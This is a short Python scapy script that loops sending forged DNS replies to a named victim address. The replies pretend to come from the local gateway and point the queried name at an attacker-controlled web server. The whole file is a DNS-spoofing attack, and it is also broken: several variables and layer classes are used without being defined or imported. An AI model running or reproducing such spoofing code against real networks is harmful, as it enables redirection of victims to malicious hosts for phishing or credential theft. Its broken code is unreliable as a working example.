from scapy.all import ARP, Ether, send, sniff, IP, TCP, srp


while True :

    dns_response = (
        IP(dst="192.168.1.82", src="192.168.1.254") /  # IP layer
        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
        DNS(
            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
            an=DNSRR(rrname=qname, ttl=60, rdata=web_server.get("ip")),  # Spoofed response
            ns=DNSRR(rrname=qname, ttl=60, rdata=web_server.get("ip")),  # Authority section
        )
    )

    # Send the spoofed DNS response to the victim
    send(dns_response, verbose=False)